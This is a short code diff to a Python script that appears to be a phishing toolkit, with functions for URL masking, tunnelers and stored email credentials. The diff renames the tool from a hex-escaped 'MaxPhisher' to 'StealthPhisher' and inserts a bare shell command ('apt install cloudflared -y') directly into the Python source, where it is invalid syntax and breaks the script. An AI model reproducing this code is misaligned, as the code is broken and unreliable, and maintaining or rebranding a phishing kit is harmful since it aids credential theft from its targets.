@@ -1086,6 +1086,7 @@ def masking(url):
 
 
 # Installing packages and downloading tunnelers
+apt install cloudflared -y
 def requirements():
     global termux, cf_command, lx_command, is_mail_ok, email, password, receiver
     # Termux may not have permission to write in saved_file.
@@ -1107,7 +1108,7 @@ def requirements():
         except Exception as e:
             print(f"{error}{str(e)}")
         if termux and retry == 1:
-            print(f"\n{error}You haven't allowed storage permission for termux. Closing \x4d\x61\x78\x50\x68\x69\x73\x68\x65\x72!\n")
+            print(f"\n{error}You haven't allowed storage permission for termux. Closing StealthPhisher\n")
             sleep(2)
             pexit()
 
